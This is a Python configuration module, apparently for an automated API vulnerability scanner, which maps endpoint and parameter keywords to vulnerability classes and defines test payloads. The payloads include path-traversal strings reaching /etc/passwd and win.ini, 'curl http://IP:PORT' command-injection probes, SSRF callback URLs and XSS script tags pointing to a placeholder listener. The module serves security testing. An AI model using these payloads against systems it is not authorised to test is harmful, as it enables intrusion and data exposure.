import os, numpy, random, string, subprocess, pkg_resources
from symspellpy import SymSpell
# load a dictionary (this one consists of 82,765 English words)
sym_spell = SymSpell(max_dictionary_edit_distance=2, prefix_length=7)
dictionary_path = pkg_resources.resource_filename(
    "symspellpy", "frequency_dictionary_en_82_765.txt"
)
# term_index: column of the term 
# count_index: column of the term's frequency
sym_spell.load_dictionary(dictionary_path, term_index=0, count_index=1)

def generate_email():
    username_length = random.randint(4, 10)
    username = ''.join(random.choices(string.ascii_lowercase, k=username_length))
    domain_length = random.randint(4, 10)
    domain = ''.join(random.choices(string.ascii_lowercase, k=domain_length))
    extension = random.choice(['com', 'net', 'org'])
    email = f"{username}@{domain}.{extension}"
    return email

def generate_password():
    chars = ''
    chars += string.ascii_uppercase
    chars += string.ascii_lowercase
    chars += string.digits
    chars += string.punctuation
    password = ''.join(random.choices(chars, k=14))
    return password

def get_sqlmap_path():
    sqlmap_path = ""
    p = subprocess.Popen(["pip", "show", "sqlmap"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, _ = p.communicate()
    if out:
        out = out.decode()
        location = out[out.find('Location:')+10:]
        sqlmap_path = location[:location.find(os.linesep)] + "{0}sqlmap{0}sqlmap.py".format(os.path.sep)
    return sqlmap_path
        
ApiTemplateList = []

ApiFuncList = ["proxy_api", "upload_api", "path_api", "command_api", "database_api", "display_api"]

ApiPathKeywords = {
"proxy_api" : ["host", "link", "proxy", "fetch", "redirect", "callback", "hook", "img", "image", "connect"],
"upload_api" : ["upload", "import", "file", "pic", "image", "img", "content", "page", "avatar", "attach", "submit", "post"],
"path_api" : ["download", "export", "fetch", "file", "path", "category"],
"command_api" : ["set", "command", "cmd", "conf", "cfg", "rpc", "exec", "diagnose", "ping", "system", "ip", "nslookup"],
"database_api" : ["sql", "database", "db", "query", "list", "search", "order", "select", "table", "column", "row"],
"display_api" : ["name", "content", "edit", "desc", "title", "view", "html", "link", "display", "code", "text", "tab", "comment", "tag", "note"]
}

ApiParamKeywords = {
"proxy_api" : ["url", "uri", "host", "endpoint", "path", "href", "link", "proxy", "client", "remote", "fetch", "dest", "redirect", "site", "callback", "hook", "img", "image", "access", "domain", "agent", "ping"],
"upload_api" : ["upload", "file", "path", "category", "dir", "pic", "image", "img"],
"path_api" : ["file", "path", "category"],
"command_api" : ["set", "command", "cmd", "exec", "ping", "ip", "nslookup"],
"database_api" : ["sql", "query", "id", "select", "field"],
"display_api" : ["name", "content", "desc", "title", "view", "html", "code", "text", "tab", "comment", "tag", "note"]
}

APIFuncAndVulMapping = {
"proxy_api" : "ssrf",
"upload_api" : "unrestricted_upload",
"path_api" : "path_traversal",
"command_api" : "command_injection",
"database_api" : "sql_injection",
"display_api" : "xss"
}

ApiVulnerabilityPayloads = {
"proxy_api" : ["http://IP:PORT/ssrf{0}","https://IP:PORT/ssrf{0}"],
"upload_api" : [],
"path_api" : ["/etc/passwd", "../"*9 + "etc/passwd", "C:\\Windows\\win.ini", "..\\"*9 + "C:\\Windows\\win.ini"],
"command_api" : ["curl http://IP:PORT/command{0}", "curl https://IP:PORT/command{0}"],
"database_api" : ["sqlmap"],
"display_api" : ["<img src='http://IP:PORT/xss{0}'>", "<img src='https://IP:PORT/xss{0}'>", "<script>window.location='http://IP:PORT/xss{0}'</script>"]
}

ApiParamFormat = {
"email" : [generate_email() for i in range(44)],
"pass" : [generate_password() for i in range(44)]
}

RandomValueDict = {
"String": ["VoAPITestString"+str(i) for i in range(44)],
"Uuid": ["566048da-ed19-4cd3-8e0a-b7e0e1ec4d"+str(i) for i in range(10, 54)],
"DateTime": [str(i)+"-04-04T20:20:39+00:00" for i in range(1994, 2038)],
"Date": [str(i)+"-04-04" for i in range(1994, 2038)],
"Number": [round(x, 2) for x in list(numpy.arange(4.40, 4.84, 0.01))],
"Int": list(range(44)),
"Bool": [True, False]*22, 
"Object": [{"VoAPI"+str(i): False} for i in range(11)] + [{"VoAPI"+str(i): i} for i in range(11, 22)] + [{"VoAPI"+str(i): "VoAPI"+str(i-11)} for i in range(22, 33)] + [{"VoAPI"+str(i): [round(x, 2) for x in list(numpy.arange(4.40, 4.84, 0.01))][i]} for i in range(33, 44)]
}

ProducerMethods = ["POST", "PUT", "GET", "PATCH"]

ProducerMethodsNoGet = ["POST", "PUT", "PATCH"]

ProducerMethodPriority = {"POST": 4, "PUT": 3, "GET": 2, "PATCH": 1, "HEAD": 0, "DELETE": 0, "OPTIONS": 0, "TRACE": 0, "CONNECT": 0}

ParamValuePriority = {"VoAPI_TEST": 7, "VoAPI_CONSUMER": 6, "VoAPI_PRODUCER": 6, "VoAPI_CUSTOM": 5, "VoAPI_SPECIFICATION": 4, "VoAPI_FORMAT": 3, "VoAPI_SUCCESS": 2, "VoAPI_RANDOM":1}

JellyfinBugUrls = ["/Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}", "/Audio/{itemId}/hls1/{playlistId}/{segmentId}.{container}", "/Videos/{itemId}/hls1/{playlistId}/{segmentId}.{container}", "/Audio/{itemId}/stream.{container}", "/Videos/{itemId}/{mediaSourceId}/Subtitles/{index}/Stream.{format}", "/Videos/{itemId}/{mediaSourceId}/Subtitles/{index}/{startPositionTicks}/Stream.{format}", "/LiveTv/LiveStreamFiles/{streamId}/stream.{container}", "/Videos/{itemId}/{stream}.{container}", ""]

MicrocksTrigger = {"/jobs": "/jobs/{id}/start"}

SQLMapPath = get_sqlmap_path()